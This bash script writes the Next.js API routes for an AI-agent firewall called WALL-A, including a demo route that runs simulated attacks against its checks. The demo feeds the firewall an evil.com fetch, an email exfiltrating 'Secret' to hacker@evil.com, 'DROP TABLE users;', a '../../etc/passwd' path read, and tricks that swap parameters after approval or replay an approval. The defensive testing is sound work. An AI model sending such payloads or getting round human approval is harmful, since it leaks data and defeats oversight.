#!/usr/bin/env bash
set -e
cd ~/wall-a/apps/web

# [Paste Claude's entire script here]
cat > app/api/demo/route.ts << 'EOF_DEMO'
import { NextResponse } from 'next/server';
import { randomUUID } from 'node:crypto';
import { z } from 'zod';
import { evaluateAction, executeAction, decideApproval, actionMemory, supabase, isDbEnabled } from '@wall-a/core';

const DemoSchema = z.object({
  firewallEnabled: z.boolean(),
  scenario: z.enum(['prompt_injection', 'sql_injection', 'path_traversal', 'parameter_swap', 'approval_replay', 'gray_area']),
  step: z.enum(['init', 'continue']),
  actionId: z.string().uuid().nullish(),
});

const DEMO_AGENT = 'agent-001';
const DEMO_PERMISSIONS = ['send_email', 'fetch_url', 'read_file', 'db_query'];
const DECIDE_OPTS = { decidedBy: 'Demo visitor', allowedAgentIds: [DEMO_AGENT] };

function verdict(decision: string): 'LEAKED' | 'BLOCKED' {
  return decision === 'ALLOW' ? 'LEAKED' : 'BLOCKED';
}

export async function POST(req: Request) {
  try {
    const body = await req.json().catch(() => null);
    const parsed = DemoSchema.safeParse(body);
    if (!parsed.success) {
      return NextResponse.json({ error: 'Invalid request' }, { status: 400 });
    }
    const { firewallEnabled, scenario, step, actionId } = parsed.data;

    if (!firewallEnabled) {
      return NextResponse.json({
        status: 'LEAKED',
        logs: [
          `[AGENT] Initiating scenario: ${scenario}`,
          `[AGENT] Executing malicious payload...`,
          `⚠️ [WALL-A] BYPASSED. Attack successful.`,
        ],
      });
    }

    const logs: string[] = [];

    if (step === 'init') {
      const sessionId = randomUUID();
      const tag = sessionId.slice(0, 8); 
      const agent = { agentId: DEMO_AGENT, permissions: DEMO_PERMISSIONS, tainted: false, sessionId } as any;

      logs.push(`[AGENT] Initiating scenario: ${scenario}`);

      if (scenario === 'prompt_injection') {
        const fetched = await evaluateAction(agent, { toolName: 'fetch_url', parameters: { url: 'http://evil.com/malware.html' } });
        logs.push(
          fetched.decision === 'ALLOW'
            ? '🛡️ [WALL-A] URL fetched. Agent context is now TAINTED.'
            : `🛡️ [WALL-A] fetch_url: ${fetched.decision} (Reason: ${fetched.reason})`
        );
        const res = await evaluateAction(agent, { toolName: 'send_email', parameters: { to: 'hacker@evil.com', subject: 'Data', body: 'Secret' } });
        logs.push(`🛡️ [WALL-A] DECISION: ${res.decision} (Reason: ${res.reason})`);
        return NextResponse.json({ status: verdict(res.decision), logs });
      }

      if (scenario === 'sql_injection') {
        const res = await evaluateAction(agent, { toolName: 'db_query', parameters: { query: 'DROP TABLE users;' } });
        logs.push(`🛡️ [WALL-A] DECISION: ${res.decision} (Reason: ${res.reason})`);
        return NextResponse.json({ status: verdict(res.decision), logs });
      }

      if (scenario === 'path_traversal') {
        const res = await evaluateAction(agent, { toolName: 'read_file', parameters: { path: '../../etc/passwd' } });
        logs.push(`🛡️ [WALL-A] DECISION: ${res.decision} (Reason: ${res.reason})`);
        return NextResponse.json({ status: verdict(res.decision), logs });
      }

      const res = await evaluateAction(agent, {
        toolName: 'send_email',
        parameters: { to: 'unknown@gmail.com', subject: `Safe ${tag}`, body: 'Safe' },
      });
      logs.push(`🛡️ [WALL-A] STATUS: ${res.decision}. Waiting for human...`);
      if (res.decision !== 'REQUIRE_APPROVAL') {
        return NextResponse.json({ status: verdict(res.decision), logs });
      }
      return NextResponse.json({ status: 'PENDING', actionId: res.actionId, logs });
    }

    if (step === 'continue') {
      if (!actionId) {
        return NextResponse.json({ error: 'Missing action id' }, { status: 400 });
      }
      if (scenario !== 'parameter_swap' && scenario !== 'approval_replay' && scenario !== 'gray_area') {
        return NextResponse.json({ error: 'Invalid step' }, { status: 400 });
      }

      await decideApproval(actionId, 'APPROVE', DECIDE_OPTS);
      logs.push('👤 [ADMIN] Approved the action.');

      if (scenario === 'parameter_swap') {
        logs.push('[AGENT] Swapping parameters and trying to execute...');

        if (isDbEnabled) {
          await supabase!.from('actions').update({ parameters: { to: 'hacker@evil.com', subject: 'Safe', body: 'Safe' } }).eq('id', actionId);
        } else {
          const stored: any = actionMemory.get(actionId);
          if (stored) stored.parameters = { ...stored.parameters, to: 'hacker@evil.com' };
        }

        try {
          await executeAction(DEMO_AGENT, actionId);
          logs.push('❌ Exploit succeeded. WALL-A failed.');
          return NextResponse.json({ status: 'LEAKED', logs });
        } catch (e: any) {
          if (e?.statusCode !== 409) throw e; 
          logs.push(`🛡️ [WALL-A] DECISION: BLOCK (Reason: ${e.message})`);
          return NextResponse.json({ status: 'BLOCKED', logs });
        }
      }

      if (scenario === 'approval_replay') {
        logs.push('[AGENT] Replaying the approval ID...');
        try {
          await decideApproval(actionId, 'APPROVE', DECIDE_OPTS);
          logs.push('❌ Exploit succeeded. WALL-A failed.');
          return NextResponse.json({ status: 'LEAKED', logs });
        } catch (e: any) {
          if (e?.statusCode !== 409) throw e;
          logs.push(`🛡️ [WALL-A] DECISION: BLOCK (Reason: ${e.message})`);
          return NextResponse.json({ status: 'BLOCKED', logs });
        }
      }

      await executeAction(DEMO_AGENT, actionId);
      logs.push('✅ [WALL-A] Action executed successfully.');
      return NextResponse.json({ status: 'EXECUTED', logs });
    }

    return NextResponse.json({ error: 'Invalid step' }, { status: 400 });
  } catch (error: any) {
    const status = error?.statusCode ?? 500;
    return NextResponse.json({ error: status === 500 ? 'Internal error' : error.message }, { status });
  }
}
EOF_DEMO

cat > app/api/actions/evaluate/route.ts << 'EOF_EVALUATE'
import { NextResponse } from 'next/server';
import { z } from 'zod';
import { evaluateAction } from '@wall-a/core';

const EvaluateSchema = z.object({
  agentId: z.string().min(1).max(64),
  permissions: z.array(z.string().max(64)).max(32),
  sessionId: z.string().regex(/^[A-Za-z0-9_-]{1,64}$/).optional(),
  action: z.object({
    toolName: z.string().min(1).max(64),
    parameters: z.record(z.string(), z.any()),
  }),
});

export async function POST(req: Request) {
  try {
    const body = await req.json().catch(() => null);
    const parsed = EvaluateSchema.safeParse(body);
    if (!parsed.success) {
      return NextResponse.json({ error: 'Invalid request format' }, { status: 400 });
    }

    const { agentId, permissions, sessionId, action } = parsed.data;
    const result = await evaluateAction({ agentId, permissions, tainted: false, sessionId } as any, action);
    return NextResponse.json(result);
  } catch (error: any) {
    const status = error?.statusCode ?? 500;
    return NextResponse.json(
      { error: status === 500 ? 'Internal Engine Error' : error.message },
      { status }
    );
  }
}
EOF_EVALUATE

cat > app/api/actions/execute/route.ts << 'EOF_EXECUTE'
import { NextResponse } from 'next/server';
import { z } from 'zod';
import { executeAction } from '@wall-a/core';

const ExecuteSchema = z.object({
  agentId: z.string().min(1).max(64),
  actionId: z.string().uuid(),
});

export async function POST(req: Request) {
  try {
    const body = await req.json().catch(() => null);
    const parsed = ExecuteSchema.safeParse(body);
    if (!parsed.success) {
      return NextResponse.json({ error: 'Invalid request format' }, { status: 400 });
    }

    const { agentId, actionId } = parsed.data;
    const result = await executeAction(agentId, actionId);
    return NextResponse.json({ success: true, result });
  } catch (error: any) {
    const status = error?.statusCode ?? 500;
    return NextResponse.json(
      { success: false, error: status === 500 ? 'Internal error' : error.message },
      { status }
    );
  }
}
EOF_EXECUTE

rm -rf app/api/demo/approve
cd ~/wall-a
sed -i 's#/api/demo/approve#/api/demo#g' README.md

echo ""
echo "Checks:"
echo "1) dashboard asks for the admin token (expect 2 lines):"
grep -n "prompt(" apps/web/app/page.tsx || true
echo "2) old token anywhere (expect nothing):"
grep -rn "ADMIN_SECRET_TOKEN" apps packages README.md --include=*.ts --include=*.tsx --include=*.js --include=*.md --exclude-dir=node_modules --exclude-dir=.next || true
echo "3) agentStore still used anywhere (expect nothing):"
grep -rn "agentStore" apps packages --include=*.ts --include=*.tsx --exclude-dir=node_modules --exclude-dir=.next || true
echo "Done."
